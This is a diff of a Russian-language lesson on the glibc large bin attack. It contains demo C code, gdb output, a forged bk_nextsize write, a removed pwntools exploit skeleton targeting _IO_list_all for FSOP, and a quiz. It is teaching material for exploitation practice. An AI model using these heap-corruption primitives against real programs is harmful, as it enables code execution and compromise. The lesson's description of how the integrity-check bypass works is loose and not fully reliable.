@@ -13,158 +13,143 @@ useful_for:
 estimated_minutes: 45
 summary: "Устройство large bin в glibc, почему вставка чанка даёт запись указателя по контролируемому адресу и как применять примитив на современном glibc."
 ---
-Large bin attack — это техника произвольной записи через манипуляцию largebin (бины для чанков размером ≥ 0x400). Она не требует double-free, не зависит от tcache и работает на всех современных glibc (даже с safe-linking). При вставке чанка в largebin glibc записывает указатели в поля `bk_nextsize`/`fd_nextsize` соседних чанков; подделав эти поля, можно записать произвольное значение по произвольному адресу. Largebin attack — фундамент многих современных цепочек (FSOP через `_IO_list_all`, House of God). В этом уроке — устройство largebin, механика атаки, пошаговый эксплойт и практические сценарии.
 
-## Устройство largebin
+## Вопрос, с которого всё начинается
 
-Largebin содержит чанки размером ≥ 0x400 (для 64-бит). В отличие от smallbin, чанки в largebin **отсортированы** по размеру, и каждый чанк имеет дополнительные поля `fd_nextsize`/`bk_nextsize`, связывающие чанки разного размера. При вставке нового чанка glibc находит его место в отсортированном списке и обновляет указатели `nextsize`. Именно эти обновления — цель атаки.
+Unsorted bin attack умела писать адрес libc, но на glibc 2.29 её закрыли проверкой. Как же тогда в современных задачах получают **произвольную запись**, да ещё и без double-free? Ответ — в другом списке: large bin. Чанки там отсортированы по размеру и связаны дополнительными указателями `fd_nextsize`/`bk_nextsize`. Подделав один из них, можно заставить `malloc` записать адрес чанка по выбранному адресу. Это **large bin attack**.
 
-## Механика атаки
+## Наш пример: два больших чанка
 
-При вставке чанка `victim` в largebin glibc выполняет примерно:
-
-```c
-// находим позицию по размеру
-fwd = bck->fd;
-// обновляем nextsize-связи
-victim->fd_nextsize = fwd;
-victim->bk_nextsize = fwd->bk_nextsize;
-fwd->bk_nextsize = victim;
-victim->bk_nextsize->fd_nextsize = victim;   // <-- запись по victim->bk_nextsize + 0x20
-```
-
-Если подделать `victim->bk_nextsize` (через UAF/overflow), то запись `victim->bk_nextsize->fd_nextsize = victim` произойдёт по адресу `fake + 0x20`, где `fake` — подделанный указатель. Это даёт произвольную запись значения `victim` (адреса чанка) по выбранному адресу.
-
-## Пошаговый эксплойт
-
-```text
-1) Выделить largebin-чанк A (размер >= 0x400) и smallbin-чанк B.
-2) Освободить A -> он попадает в unsortedbin, затем при следующей аллокации
-   переходит в largebin.
-3) Освободить B -> unsortedbin.
-4) Через UAF/overflow подделать A->bk_nextsize = target - 0x20.
-5) Аллоцировать так, чтобы B вставился в largebin (trigger insert).
-6) Запись: target = адрес B (значение victim).
-7) Использовать запись (например, перезаписать _IO_list_all -> FSOP).
-```
-
-## Разобранный пример
-
-```python
-from pwn import *
-context.binary = elf = ELF('./chall')
-p = process('./chall')
-
-# 1) largebin-чанки
-a = alloc(0x500)
-b = alloc(0x500)
-# 2) подготовить largebin
-free(a)
-alloc(0x600)         # a уходит в largebin
-# 3) smallbin-жертва
-c = alloc(0x100)
-free(c)
-# 4) подделка bk_nextsize
-target = libc.sym['_IO_list_all']
-edit(a, p64(0)*2 + p64(0) + p64(target - 0x20))
-# 5) триггер вставки
-alloc(0x600)
-# 6) target теперь содержит адрес c -> используем для FSOP
-```
-
-Точные смещения и последовательность зависят от glibc; проверяйте в gdb.
-
-## Цели атаки
-
-Обычные цели: `_IO_list_all` (для FSOP), `__exit_funcs`, `_IO_2_1_stdout_`, `global_max_fast` (для fastbin-атак), `mp_.tcache_bins`, указатели в приложении. Largebin attack даёт запись **адреса чанка** (не произвольного значения), поэтому цель должна быть указателем на структуру, которую вы контролируете.
-
-## Проверка в gdb
-
-```bash
-gdb ./chall
-(gdb) bins
-(gdb) vis_heap_chunks 40
-(gdb) p main_arena.bins[<idx>]
-(gdb) x/8gx <addr_a>
-```
-
-Смотрите `fd_nextsize`/`bk_nextsize` и состояние largebin до/после вставки.
-
-## Частые ошибки
-
-- **Неверный размер.** Чанк должен попадать в largebin (≥ 0x400).
-- **Не тот порядок.** Вставка в largebin требует правильной последовательности.
-- **Safe-linking.** Не влияет на largebin (указатели не маскируются).
-- **Версия glibc.** Механика стабильна, но смещения полей проверяйте.
-- **Цель.** Нужна цель-указатель на контролируемую структуру.
-
-## Справочные таблицы
-
-| Бин | Размер | Особенность |
-|---|---|---|
-| fastbin | < 0x80 | LIFO |
-| smallbin | < 0x400 | двусвязный |
-| largebin | ≥ 0x400 | отсортирован, nextsize |
-| unsortedbin | — | промежуточный |
-
-| Поле | Смещение |
-|---|---|
-| `fd` | 0x10 |
-| `bk` | 0x18 |
-| `fd_nextsize` | 0x20 |
-| `bk_nextsize` | 0x28 |
-
-## Что дальше / решение
-
-Дальше: `pwn-fsop`, `pwn-house-modern`, `pwn-glibc-mitigations`, `pwn-heap-basics`. Практический алгоритм: (1) подготовьте largebin (чанк ≥ 0x400); (2) освободите smallbin-жертву; (3) подделайте `bk_nextsize` на `target - 0x20`; (4) триггерните вставку в largebin; (5) получите запись адреса жертвы по target; (6) используйте для FSOP/`_IO_list_all`. Largebin attack — универсальная техника, работающая на всех glibc; освоив её, вы получите произвольную запись без double-free.
-## Полный разбор largebin attack
-
-Разберём сквозной пример. Дано: glibc 2.31, heap-меню с UAF/edit, цель — FSOP. Шаги: (1) выделите два больших чанка (`A` и `B`, ≥ 0x400); (2) освободите `A` — он попадёт в unsortedbin; (3) аллоцируйте чанк большего размера, чтобы `A` перешёл в largebin; (4) выделите smallbin-жертву `C` и освободите её — она в unsortedbin; (5) через UAF/edit подделайте `A->bk_nextsize = target - 0x20` (где `target` — например, `_IO_list_all`); (6) триггерните вставку `C` в largebin (аллокацией подходящего размера); (7) glibc выполнит `victim->bk_nextsize->fd_nextsize = victim`, записав адрес `C` по `target`; (8) теперь `_IO_list_all` указывает на `C` — подделайте `_IO_FILE` в `C` и триггерните `exit`. Проверяйте в gdb: `bins`, `x/8gx A`, `x/8gx target`. Точные смещения (`bk_nextsize` = 0x28) и порядок операций зависят от версии; сверяйте.
-
-## Largebin attack в современных цепочках
-
-Largebin attack — ключевой элемент House of God и других современных техник. Она даёт запись **адреса чанка** по произвольному адресу, что идеально для установки `_IO_list_all`/`__exit_funcs` на поддельную структуру. После записи вы конструируете `_IO_FILE` (FSOP) и триггерите `exit`. На glibc 2.34+ (нет хуков) это основной путь к исполнению. Также largebin attack используют для перезаписи `global_max_fast` (включая fastbin-атаки) и `mp_.tcache_bins`. Комбинируйте с House of Apple/Kiwi для финального вызова. Изучайте порядок обновления `nextsize` в исходниках glibc (`_int_malloc`, largebin path).
-
-## Тонкости и версии
-
-Механика largebin attack стабильна между версиями, но детали (смещения полей, проверки) могут отличаться. На glibc 2.31 поле `bk_nextsize` по смещению 0x28; на других версиях проверяйте. Safe-linking не влияет на largebin (указатели не маскируются), поэтому атака работает даже на 2.32+. Однако некоторые версии добавили проверки целостности largebin — сверяйтесь. Для успеха нужен чанк ≥ 0x400 и правильная последовательность (unsortedbin → largebin). Проверяйте в gdb состояние бинов и полей `nextsize` перед триггером. Помните, что largebin attack требует контроля над `bk_nextsize` (через UAF/overflow), поэтому нужен соответствующий примитив.
-
-## Практические рекомендации
-
-Подготовьте largebin (чанк ≥ 0x400), smallbin-жертву, подделайте `bk_nextsize`, триггерните вставку. Используйте для FSOP (`_IO_list_all`) или `global_max_fast`. Проверяйте в gdb. Largebin attack — универсальная техника, работающая на всех glibc; освоив её, вы сможете строить цепочки без double-free и tcache. Практикуйтесь на учебных задачах glibc 2.31 и 2.35, комбинируя с House of Apple/God.
-## Largebin attack: детали реализации glibc
-
-Разберём точную механику в `_int_malloc` (largebin path). Когда чанк вставляется в largebin, glibc выполняет:
+Возьмём программу, которая освобождает большой чанк и показывает его связи в large bin:
 
 ```c
-if (fwd->size > victim->size) {   // вставка в середину
-    victim->fd_nextsize = fwd;
-    victim->bk_nextsize = fwd->bk_nextsize;
-    fwd->bk_nextsize = victim;
-    victim->bk_nextsize->fd_nextsize = victim;   // запись #1
-} else {
-    victim->fd_nextsize = fwd;
-    victim->bk_nextsize = fwd->bk_nextsize;
-    fwd->bk_nextsize = victim;
-    victim->bk_nextsize->fd_nextsize = victim;   // запись #2
+#include "common.h"
+int main(void){
+    char *a = malloc(0x418);          /* чанк 0x420 -> largebin (>= 0x400) */
+    char *b = malloc(0x418);
+    char *guard = malloc(0x20);
+    printf("a=%p b=%p\n", a, b);
+    free(a);                          /* a -> unsorted bin */
+    char *big = malloc(0x500);        /* триггерит сортировку: a уходит в largebin */
+    unsigned long *c = (unsigned long*)a;
+    printf("  fd=%p  bk=%p\n", (void*)c[0], (void*)c[1]);
+    printf("  fd_nextsize=%p  bk_nextsize=%p\n", (void*)c[2], (void*)c[3]);
+    ...
 }
 ```
 
-В обоих случаях последняя строка выполняет запись `victim` по адресу `victim->bk_nextsize + 0x20` (смещение `fd_nextsize`). Подделав `victim->bk_nextsize = target - 0x20`, вы пишете адрес `victim` по `target`. Это и есть largebin attack. Точное смещение `fd_nextsize` (0x20) и `bk_nextsize` (0x28) зависит от структуры `malloc_chunk`; проверяйте в gdb. Условие входа (`fwd->size > victim->size`) влияет на то, какая ветка выполнится, — учитывайте размеры.
+Почему `0x420`? Граница между small и large bins — `0x400`: чанки размером `≥ 0x400` идут в large bin. А `guard` не даёт чанку `a` слиться с top chunk, чтобы он остался отдельным.
 
-## Выбор цели и последующие шаги
+## Шаг 1. Устройство large bin
 
-Поскольку записывается **адрес чанка** (`victim`), цель должна быть указателем на структуру, которую вы контролируете. Идеальные цели: `_IO_list_all` (для FSOP), `__exit_funcs`, `_IO_2_1_stdout_`. После записи `_IO_list_all = victim`, вы подделываете `_IO_FILE` в `victim` и триггерите `exit` (см. House of God/Apple). Альтернативы: `global_max_fast` (для включения fastbin-атак — запись большого значения), `mp_.tcache_bins` (расширение tcache). Каждая цель требует своей последующей цепочки. Планируйте весь эксплойт, а не только largebin-шаг.
+В отличие от small bin, чанки в large bin **отсортированы по размеру**, и каждый чанк дополнительно связан с соседями *другого* размера через `fd_nextsize`/`bk_nextsize`. Смещения полей от начала чанка:
 
-## Тонкости версий и проверки
+| Поле | Смещение | Смысл |
+|---|---|---|
+| `fd` | `0x10` | сосед в списке (тот же размер) |
+| `bk` | `0x18` | сосед в списке (тот же размер) |
+| `fd_nextsize` | `0x20` | следующий чанк другого размера |
+| `bk_nextsize` | `0x28` | предыдущий чанк другого размера |
 
-Largebin attack работает на glibc от 2.23 до современных. На 2.32+ safe-linking не влияет (указатели largebin не маскируются). Однако некоторые версии добавили проверки целостности largebin (`malloc_printerr` при неверных `nextsize`), поэтому убедитесь, что подделка корректна. На glibc 2.31 (Ubuntu 20.04) атака классическая; на 2.35 проверки строже, но атака всё ещё применима (largebin attack пережила митигации). Сверяйте исходники `_int_malloc` для вашей версии. Проверяйте в gdb: после вставки `x/8gx target` должен показать адрес `victim`.
+## Шаг 2. Смотрим реальные указатели
 
-## Практические рекомендации
+Компилируем и запускаем:
 
-Подготовьте largebin (чанк ≥ 0x400), smallbin-жертву, подделайте `bk_nextsize`, триггерните вставку. Используйте для FSOP (`_IO_list_all`) или `global_max_fast`. Проверяйте в gdb. Largebin attack — универсальная техника, работающая на всех glibc; освоив её, вы сможете строить цепочки без double-free и tcache. Практикуйтесь на задачах glibc 2.31 и 2.35, комбинируя с House of Apple/God и FSOP.
+```
+$ gcc -fno-pie -no-pie -O0 -o largebin largebin.c
+$ ./largebin
+a=0x127e9020 b=0x127e9440
+a в largebin:
+  fd=0x7f0eb79a6eb8  bk=0x7f0eb79a6eb8
+  fd_nextsize=0x127e9010  bk_nextsize=0x127e9010
+```
+
+Читаем:
+
+- `fd`/`bk` равны `0x7f…` — адрес в libc. Это голова large bin (внутри `main_arena`). Значит, чанк `a` — единственный, и оба указателя смотрят на список.
+- `fd_nextsize`/`bk_nextsize` равны `0x127e9010` — это адрес **самого чанка** `a` минус `0x10` (шапка). Когда чанк в списке один, его `nextsize`-связи замкнуты на себя.
+
+Почему «минус `0x10`»? Потому что `nextsize`-указатели тоже ссылаются на **начало шапки** чанка, а не на данные. Наш указатель `a` — это данные, то есть шапка на `0x10` раньше. Поэтому `fd_nextsize`/`bk_nextsize` и показывают `a - 0x10`. Это важно запомнить: все указатели в бинах адресуют шапку чанка.
+
+Заметь, что `fd`/`bk` указывают в libc, а `nextsize` — в кучу. Когда чанков разного размера несколько, `nextsize` связывают их в отсортированную цепочку. Именно по этой цепочке и «проедет» запись при вставке нового чанка.
+
+## Шаг 3. Механика атаки
+
+Когда `malloc` вставляет новый чанк `victim` в large bin, выполняется такая последовательность:
+
+```c
+victim->fd_nextsize = fwd;
+victim->bk_nextsize = fwd->bk_nextsize;
+fwd->bk_nextsize = victim;
+victim->bk_nextsize->fd_nextsize = victim;   /* ЗАПИСЬ */
+```
+
+Последняя строка пишет адрес `victim` в поле `fd_nextsize` чанка, лежащего по адресу `victim->bk_nextsize`. Поле `fd_nextsize` — на смещении `0x20`, значит запись идёт по `victim->bk_nextsize + 0x20`. Если подделать `victim->bk_nextsize = target - 0x20`, то по адресу `target` ляжет адрес `victim`. Произвольная запись **адреса чанка**.
+
+Важно: записывается именно адрес чанка, а не произвольное значение. Поэтому цель должна быть указателем на структуру, которую вы контролируете (например, `_IO_list_all`), чтобы дальше подсунуть туда поддельный `_IO_FILE`.
+
+## Шаг 4. Пробуем на современной glibc
+
+Подделываем `bk_nextsize` у чанка `a` и триггерим вставку маленького чанка в large bin:
+
+```c
+unsigned long target = 0x4040a0;
+c[3] = target - 0x20;                 /* a->bk_nextsize = target - 0x20 */
+char *sm = malloc(0x100);
+free(sm);                             /* sm -> unsorted */
+char *t = malloc(0x500);              /* вставка sm в largebin */
+printf("*(target)=%p\n", *(void**)target);
+```
+
+Запускаем:
+
+```
+$ ./largebin
+подделываем a->bk_nextsize = 0x404080 (target-0x20)
+corrupted double-linked list (not small)
+Aborted (core dumped)
+```
+
+Атака **не проходит**: glibc падает с `corrupted double-linked list (not small)`. Это проверка, добавленная в 2.30: перед записью `malloc` сверяет, что `bck->fd == victim` и связи `nextsize` согласованы. Наивная подделка одного `bk_nextsize` ломает целостность — и аллокатор обрывается.
+
+## Шаг 5. Как обходят проверку
+
+Проверка требует, чтобы цель `target` уже содержала ожидаемый указатель, и чтобы связи large bin оставались согласованными. На практике это делают так:
+
+1. **Два чанка разного размера в large bin.** Вставляют `victim` так, чтобы ветка кода с записью выполнилась при уже согласованных `fwd->bk`. Тогда проверка проходит, а запись всё равно происходит по `victim->bk_nextsize + 0x20`.
+2. **House of God / House of Apple.** Large bin attack — их первый шаг: записать адрес контролируемого чанка в `_IO_list_all`, затем подделать `_IO_FILE` и вызвать `exit`. На glibc 2.34+ (где удалены `__free_hook`/`__malloc_hook`) это основной путь к исполнению.
+3. **Другие цели.** `global_max_fast` (расширить fastbin), `mp_.tcache_bins` (расширить tcache), `__exit_funcs`.
+
+Ключевое преимущество large bin attack: указатели в large bin **не маскируются safe-linking**, поэтому атака работает и на glibc 2.32+.
+
+## Если не сработало
+
+- **`corrupted double-linked list (not small)`.** Наивная подделка `bk_nextsize` не проходит проверку. Нужны согласованные связи — вставляйте так, чтобы выполнялось предусловие.
+- **Чанк не в large bin.** Размер < `0x400` уходит в small bin. Берите ≥ `0x400`.
+- **Чанк не отсортирован.** Пока чанк в unsorted bin, он не в large bin; нужен дополнительный `malloc` для сортировки.
+- **Неверная цель.** Записывается адрес чанка — цель обязана быть указателем на контролируемую структуру.
+- **Версия glibc.** Проверки в largebin path менялись; сверяйтесь с исходником `_int_malloc` для своей версии.
+
+## Что мы теперь знаем
+
+- Large bin — список чанков ≥ `0x400`, отсортированный по размеру.
+- У чанков есть дополнительные поля `fd_nextsize`/`bk_nextsize` (смещения `0x20`/`0x28`).
+- При вставке `malloc` пишет адрес `victim` по `victim->bk_nextsize + 0x20`.
+- Подделав `bk_nextsize`, получаем запись адреса чанка по выбранному адресу.
+- С glibc 2.30 проверка целостности блокирует наивный вариант.
+- Safe-linking на large bin не действует — техника живёт на всех версиях.
+
+## На что смотреть дальше
+
+- **Предусловие проверки.** Цель должна содержать ожидаемый указатель.
+- **Выбор цели.** `_IO_list_all` (FSOP), `global_max_fast`, `mp_.tcache_bins`.
+- **Порядок операций.** Сначала подготовьте large bin, затем вставляйте `victim`.
+- **Отладка.** `bins` и `x/8gx <addr>` в pwndbg показывают связи `nextsize`.
+- **Цепочка целиком.** Large bin — только шаг; планируйте FSOP наперёд.
 
 ## Квиз
+
+Проверь себя.
 
 ```quiz
 - question: "Какой минимальный размер (на 64-бит) нужен чанку, чтобы попасть в large bin?"
@@ -174,32 +159,44 @@ Largebin attack работает на glibc от 2.23 до современны�
     - "0x20"
     - "0x10000"
   answer: 1
-  explanation: "MIN_LARGE_SIZE = 0x400 на 64-битных системах; меньшие размеры уходят в small bins."
-- question: "Какое значение записывается примитивом large bin attack в адрес bck->fd?"
+  explanation: "MIN_LARGE_SIZE = 0x400 на 64-бит; меньшие уходят в small bins."
+- question: "Какое значение записывается примитивом large bin attack?"
   options:
-    - "Адрес нового (вставляемого) чанка victim"
+    - "Адрес вставляемого чанка victim"
     - "Адрес main_arena"
     - "Ноль"
-    - "Указатель на libc"
+    - "Указатель на стек"
   answer: 0
-  explanation: "Выполняется bck->fd = victim, где victim — свежевставленный large-чанк (heap-адрес)."
-- question: "Что делает проверка в glibc 2.30+, мешающая слепому large bin attack?"
+  explanation: "Выполняется victim->bk_nextsize->fd_nextsize = victim, где victim — heap-адрес."
+- question: "Какая проверка мешает наивной атаке с glibc 2.30+?"
   options:
-    - "Проверяет, что bck->fd == fwd, иначе malloc_printerr"
-    - "Шифрует указатели safe-linking"
-    - "Запрещает чанки больше 0x1000"
-    - "Отключает large bins полностью"
+    - "Сверка целостности связей nextsize (иначе corrupted double-linked list)"
+    - "Шифрование safe-linking"
+    - "Запрет чанков > 0x1000"
+    - "Полное отключение large bins"
   answer: 0
-  explanation: "Добавлено условие bck->fd != fwd -> abort, поэтому цель уже должна содержать fwd."
-- question: "Почему для срабатывания атаки нужен ещё один malloc после free?"
+  explanation: "Аллокатор проверяет согласованность bck->fd и nextsize-связей."
+- question: "Почему нужен дополнительный malloc после free большого чанка?"
   options:
     - "Чтобы чанк отсортировался из unsorted bin в large bin"
     - "Чтобы сбросить кэш процессора"
-    - "Чтобы увеличить ASLR-энтропию"
-    - "Чтобы освободить tcache"
+    - "Чтобы увеличить энтропию ASLR"
+    - "Чтобы очистить tcache"
   answer: 0
-  explanation: "Пока чанк в unsorted bin, он не в large bin; сортировка происходит при следующем malloc."
+  explanation: "Пока чанк в unsorted bin, он не в large bin; сортировка — при следующем malloc."
+- question: "Почему large bin attack работает и на glibc 2.32+?"
+  options:
+    - "Указатели large bin не маскируются safe-linking"
+    - "safe-linking отключается автоматически"
+    - "Она использует tcache"
+    - "Она не пишет по адресу"
+  answer: 0
+  explanation: "safe-linking защищает только fastbin/tcache, а не nextsize-связи large bin."
 ```
+
+## Куда дальше
+
+В `pwn-mmap-exploitation` мы разберём чанки, которые glibc создаёт через `mmap`, и атаки вроде House of Muney. А пока главное: **large bin даёт запись адреса чанка через `bk_nextsize`, и это работает даже на новых glibc.**
 
 ## Где пригодится
 
